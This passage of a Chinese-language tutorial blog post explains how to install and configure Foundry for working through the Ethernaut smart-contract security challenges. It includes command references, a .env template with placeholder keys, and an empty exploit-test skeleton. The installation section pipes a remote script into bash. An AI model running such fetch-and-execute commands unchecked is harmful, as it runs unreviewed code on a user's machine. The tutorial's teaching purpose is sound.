id=\"🧪-基本使用\"><a href=\"#🧪-基本使用\" class=\"headerlink\" title=\"🧪 基本使用\"></a>🧪 基本使用</h2><h3 id=\"编译合约\"><a href=\"#编译合约\" class=\"headerlink\" title=\"编译合约\"></a>编译合约</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 编译所有合约</span></span><br><span class=\"line\">forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译特定合约</span></span><br><span class=\"line\">forge build src/Fallback.sol</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看编译输出</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span> out/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行所有测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定测试合约</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 详细输出 (多个 v 增加详细程度)</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定测试函数</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-test testFallbackExploit -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示 gas 报告</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用-Anvil-本地测试网\"><a href=\"#使用-Anvil-本地测试网\" class=\"headerlink\" title=\"使用 Anvil 本地测试网\"></a>使用 Anvil 本地测试网</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动本地测试网 (新终端)</span></span><br><span class=\"line\">anvil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在另一个终端中，针对本地网络运行测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --fork-url http://localhost:8545</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-常用-Foundry-命令\"><a href=\"#🔧-常用-Foundry-命令\" class=\"headerlink\" title=\"🔧 常用 Foundry 命令\"></a>🔧 常用 Foundry 命令</h2><h3 id=\"Forge-命令\"><a href=\"#Forge-命令\" class=\"headerlink\" title=\"Forge 命令\"></a>Forge 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 项目管理</span></span><br><span class=\"line\">forge init my-project          <span class=\"comment\"># 初始化新项目</span></span><br><span class=\"line\">forge build                    <span class=\"comment\"># 编译合约</span></span><br><span class=\"line\">forge clean                    <span class=\"comment\"># 清理编译输出</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 测试相关</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span>                     <span class=\"comment\"># 运行测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --watch            <span class=\"comment\"># 监视文件变化并自动测试</span></span><br><span class=\"line\">forge coverage                <span class=\"comment\"># 代码覆盖率报告</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 依赖管理</span></span><br><span class=\"line\">forge install &lt;dependency&gt;     <span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">forge remove &lt;dependency&gt;     <span class=\"comment\"># 移除依赖</span></span><br><span class=\"line\">forge update                  <span class=\"comment\"># 更新依赖</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 代码格式化</span></span><br><span class=\"line\">forge <span class=\"built_in\">fmt</span>                     <span class=\"comment\"># 格式化 Solidity 代码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Cast-命令\"><a href=\"#Cast-命令\" class=\"headerlink\" title=\"Cast 命令\"></a>Cast 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询区块链信息</span></span><br><span class=\"line\">cast block-number             <span class=\"comment\"># 获取最新区块号</span></span><br><span class=\"line\">cast balance &lt;address&gt;        <span class=\"comment\"># 查询地址余额</span></span><br><span class=\"line\">cast storage &lt;address&gt; &lt;slot&gt; <span class=\"comment\"># 读取存储槽</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 调用合约</span></span><br><span class=\"line\">cast call &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># 只读调用</span></span><br><span class=\"line\">cast send &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># 状态变更调用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 工具函数</span></span><br><span class=\"line\">cast keccak <span class=\"string\">&quot;function_signature()&quot;</span>      <span class=\"comment\"># 计算函数选择器</span></span><br><span class=\"line\">cast abi-encode <span class=\"string\">&quot;func(uint256)&quot;</span> 123     <span class=\"comment\"># ABI 编码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Anvil-命令\"><a href=\"#Anvil-命令\" class=\"headerlink\" title=\"Anvil 命令\"></a>Anvil 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动本地测试网</span></span><br><span class=\"line\">anvil                         <span class=\"comment\"># 默认配置</span></span><br><span class=\"line\">anvil --port 8545            <span class=\"comment\"># 指定端口</span></span><br><span class=\"line\">anvil --accounts 20          <span class=\"comment\"># 指定账户数量</span></span><br><span class=\"line\">anvil --balance 1000         <span class=\"comment\"># 每个账户初始余额 (ETH)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 从特定状态分叉</span></span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth</span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-Ethernaut-专用配置\"><a href=\"#🎯-Ethernaut-专用配置\" class=\"headerlink\" title=\"🎯 Ethernaut 专用配置\"></a>🎯 Ethernaut 专用配置</h2><h3 id=\"环境变量配置\"><a href=\"#环境变量配置\" class=\"headerlink\" title=\"环境变量配置\"></a>环境变量配置</h3><p>创建 <code>.env</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .env 文件</span></span><br><span class=\"line\">ETHERSCAN_API_KEY=your_etherscan_api_key</span><br><span class=\"line\">MAINNET_RPC_URL=https://rpc.ankr.com/eth</span><br><span class=\"line\">SEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia</span><br><span class=\"line\">PRIVATE_KEY=your_private_key_for_testing</span><br></pre></td></tr></table></figure>\n\n<p>加载环境变量：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在 shell 中加载</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> .<span class=\"built_in\">env</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 或在 foundry.toml 中配置自动加载</span></span><br><span class=\"line\">[profile.default]</span><br><span class=\"line\">env_file = <span class=\"string\">&quot;.env&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试模板\"><a href=\"#测试模板\" class=\"headerlink\" title=\"测试模板\"></a>测试模板</h3><p>创建标准测试文件模板：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/TargetContract.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TargetContractTest is Test &#123;</span><br><span class=\"line\">    TargetContract public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new TargetContract();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 初始化攻击者账户</span><br><span class=\"line\">        vm.deal(attacker, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击逻辑</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertTrue(/* 验证条件 */);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🐛-常见问题解决\"><a href=\"#🐛-常见问题解决\" class=\"headerlink\" title=\"🐛 常见问题解决\"></a>🐛 常见问题解决</h2><h3 id=\"编译错误\"><a href=\"#编译错误\" class=\"headerlink\" title=\"编译错误\"></a>编译错误</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理并重新编译</span></span><br><span class=\"line\">forge clean &amp;&amp; forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 Solidity 版本兼容性</span></span><br><span class=\"line\">forge build --force</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看详细错误信息</span></span><br><span class=\"line\">forge build --verbose</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"依赖问题\"><a href=\"#依赖问题\" class=\"headerlink\" title=\"依赖问题\"></a>依赖问题</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 重新安装依赖</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf lib/</span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 Git 子模块状态</span></span><br><span class=\"line\">git submodule status</span><br><span class=\"line\">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试失败\"><a href=\"#测试失败\" class=\"headerlink\" title=\"测试失败\"></a>测试失败</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 增加详细输出</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> -vvvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用调试器</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --debug &lt;test_function&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 gas 使用情况</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-进阶配置\"><a href=\"#📚-进阶配置\" class=\"headerlink\" title=\"📚 进阶配置\"></a>📚 进阶配置</h2><h3 id=\"多版本-Solidity-支持\"><a href=\"#多版本-Solidity-支持\" class=\"headerlink\" title=\"多版本 Solidity 支持\"></a>多版本 Solidity 支持</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># foundry.toml</span></span><br><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.legacy]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.6.12&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自定义测试配置\"><a href=\"#自定义测试配置\" class=\"headerlink\" title=\"自定义测试配置\"></a>自定义测试配置</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.fuzz]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">max_test_rejects</span> = <span class=\"number\">65536</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.invariant]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"attr\">depth</span> = <span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-优化设置\"><a href=\"#Gas-优化设置\" class=\"headerlink\" title=\"Gas 优化设置\"></a>Gas 优化设置</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.optimizer]</span></span><br><span class=\"line\"><span class=\"attr\">enabled</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.model_checker]</span></span><br><span class=\"line\"><span class=\"attr\">contracts</span> = &#123; <span class=\"string\">&quot;/path/to/project/src/Contract.sol&quot;</span> = [ <span class=\"string\">&quot;Contract&quot;</span> ] &#125;</span><br><span class=\"line\"><span class=\"attr\">engine</span> = <span class=\"string\">&quot;chc&quot;</span></span><br><span class=\"line\"><span class=\"attr\">targets</span> = [ <span class=\"string\">&quot;assert&quot;</span>, <span class=\"string\">&quot;underflow&quot;</span>, <span class=\"string\">&quot;overflow&quot;</span>, <span class=\"string\">&quot;divByZero&quot;</span> ]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎓-总结\"><a href=\"#🎓-总结\" class=\"headerlink\" title=\"🎓 总结\"></a>🎓 总结</h2><p>现在您已经完成了 Foundry 开发环境的搭建，可以开始 Ethernaut 安全挑战的学习之旅了！</p>\n<h3 id=\"下一步：\"><a href=\"#下一步：\" class=\"headerlink\" title=\"下一步：\"></a>下一步：</h3><ol>\n<li><strong>熟悉 Foundry 基本命令</strong></li>\n<li><strong>运行第一个测试</strong>: <code>forge test --match-contract FallbackTest -vvv</code></li>\n<li><strong>开始学习</strong>: <a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1 - Fallback</a></li>\n</ol>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry 官方文档</a></strong></li>\n<li><strong><a href=\"https://github.com/foundry-rs/foundry\">Foundry GitHub</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">下一篇: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n</ul>\n<hr>\n<p><em>工欲善其事，必先利其器。掌握好工具，才能更好地学习智能合约安全。</em> 🔧</p>\n","more":"<h1 id=\"🛠️-Foundry-环境搭建与-Ethernaut-项目配置\"><a href=\"#🛠️-Foundry-环境搭建与-Ethernaut-项目配置\" class=\"headerlink\" title=\"🛠️ Foundry 环境搭建与 Ethernaut 项目配置\"></a>🛠️ Foundry 环境搭建与 Ethernaut 项目配置</h1><blockquote>\n<p>在开始 Ethernaut 安全挑战之前，我们需要搭建一个完整的 Foundry 开发环境。本文将详细介绍从零开始的完整配置流程。</p>\n</blockquote>\n<h2 id=\"📚-什么是-Foundry\"><a href=\"#📚-什么是-Foundry\" class=\"headerlink\" title=\"📚 什么是 Foundry?\"></a>📚 什么是 Foundry?</h2><p><strong>Foundry</strong> 是一个用 Rust 编写的快速、可移植和模块化的以太坊开发工具包，包含：</p>\n<ul>\n<li><strong>Forge</strong>: 测试框架</li>\n<li><strong>Cast</strong>: 瑞士军刀般的 RPC 工具</li>\n<li><strong>Anvil</strong>: 本地测试网络</li>\n<li><strong>Chisel</strong>: Solidity REPL</li>\n</ul>\n<h3 id=\"与其他工具对比\"><a href=\"#与其他工具对比\" class=\"headerlink\" title=\"与其他工具对比\"></a>与其他工具对比</h3><table>\n<thead>\n<tr>\n<th>工具</th>\n<th>语言</th>\n<th>测试速度</th>\n<th>配置复杂度</th>\n<th>社区支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Foundry</strong></td>\n<td>Rust</td>\n<td>⭐⭐⭐⭐⭐</td>\n<td>⭐⭐☆☆☆</td>\n<td>⭐⭐⭐⭐☆</td>\n</tr>\n<tr>\n<td>Hardhat</td>\n<td>JavaScript</td>\n<td>⭐⭐⭐☆☆</td>\n<td>⭐⭐⭐☆☆</td>\n<td>⭐⭐⭐⭐⭐</td>\n</tr>\n<tr>\n<td>Truffle</td>\n<td>JavaScript</td>\n<td>⭐⭐☆☆☆</td>\n<td>⭐⭐⭐⭐☆</td>\n<td>⭐⭐⭐☆☆</td>\n</tr>\n</tbody></table>\n<h2 id=\"🚀-Foundry-安装\"><a href=\"#🚀-Foundry-安装\" class=\"headerlink\" title=\"🚀 Foundry 安装\"></a>🚀 Foundry 安装</h2><h3 id=\"方法一：使用-Foundryup-推荐\"><a href=\"#方法一：使用-Foundryup-推荐\" class=\"headerlink\" title=\"方法一：使用 Foundryup (推荐)\"></a>方法一：使用 Foundryup (推荐)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载并安装 Foundryup</span></span><br><span class=\"line\">curl -L https://foundry.paradigm.xyz | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重新加载 shell 或重启终端</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc  <span class=\"comment\"># 或 source ~/.zshrc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装最新版本的 Foundry</span></span><br><span class=\"line\">foundryup</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证安装</span></span><br><span class=\"line\">forge --version</span><br><span class=\"line\">cast --version</span><br><span class=\"line\">anvil --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二：从源码编译\"><a href=\"#方法二：从源码编译\" class=\"headerlink\" title=\"方法二：从源码编译\"></a>方法二：从源码编译</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 Foundry 仓库</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/foundry-rs/foundry</span><br><span class=\"line\"><span class=\"built_in\">cd</span> foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译安装 (需要 Rust 环境)</span></span><br><span class=\"line\">cargo build --release</span><br><span class=\"line\">cargo install --path ./crates/forge --bin forge</span><br><span class=\"line\">cargo install --path ./crates/cast --bin cast</span><br><span class=\"line\">cargo install --path ./crates/anvil --bin anvil</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法三：使用包管理器\"><a href=\"#方法三：使用包管理器\" class=\"headerlink\" title=\"方法三：使用包管理器\"></a>方法三：使用包管理器</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># macOS (Homebrew)</span></span><br><span class=\"line\">brew install foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Ubuntu/Debian (需要添加 PPA)</span></span><br><span class=\"line\"><span class=\"comment\"># 暂不支持，建议使用方法一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Windows (需要 WSL)</span></span><br><span class=\"line\"><span class=\"comment\"># 在 WSL 中执行方法一的步骤</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📁-Ethernaut-项目结构\"><a href=\"#📁-Ethernaut-项目结构\" class=\"headerlink\" title=\"📁 Ethernaut 项目结构\"></a>📁 Ethernaut 项目结构</h2><h3 id=\"克隆项目\"><a href=\"#克隆项目\" class=\"headerlink\" title=\"克隆项目\"></a>克隆项目</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 Ethernaut Foundry Solutions 项目</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看项目结构</span></span><br><span class=\"line\">tree -L 2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"项目目录结构\"><a href=\"#项目目录结构\" class=\"headerlink\" title=\"项目目录结构\"></a>项目目录结构</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Ethernaut-Foundry-Solutions/</span><br><span class=\"line\">├── foundry.toml          # Foundry 配置文件</span><br><span class=\"line\">├── .gitmodules          # Git 子模块配置</span><br><span class=\"line\">├── README.md            # 项目说明</span><br><span class=\"line\">├── lib/                 # 依赖库</span><br><span class=\"line\">│   ├── forge-std/       # Foundry 标准库</span><br><span class=\"line\">│   └── openzeppelin-contracts/  # OpenZeppelin 合约库</span><br><span class=\"line\">├── src/                 # 源码目录</span><br><span class=\"line\">│   ├── Fallback.sol     # 关卡原始合约</span><br><span class=\"line\">│   ├── Fallout.sol</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── test/                # 测试目录</span><br><span class=\"line\">│   ├── FallbackTest.sol # 攻击测试合约</span><br><span class=\"line\">│   ├── FalloutTest.sol</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── script/              # 部署脚本</span><br><span class=\"line\">└── solutions/           # 解题说明文档</span><br><span class=\"line\">    ├── 01_Fallback_zh.md</span><br><span class=\"line\">    └── ...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"⚙️-项目配置\"><a href=\"#⚙️-项目配置\" class=\"headerlink\" title=\"⚙️ 项目配置\"></a>⚙️ 项目配置</h2><h3 id=\"Foundry-配置文件\"><a href=\"#Foundry-配置文件\" class=\"headerlink\" title=\"Foundry 配置文件\"></a>Foundry 配置文件</h3><p>查看 <code>foundry.toml</code> 配置：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">src</span> = <span class=\"string\">&quot;src&quot;</span></span><br><span class=\"line\"><span class=\"attr\">out</span> = <span class=\"string\">&quot;out&quot;</span></span><br><span class=\"line\"><span class=\"attr\">libs</span> = [<span class=\"string\">&quot;lib&quot;</span>]</span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span 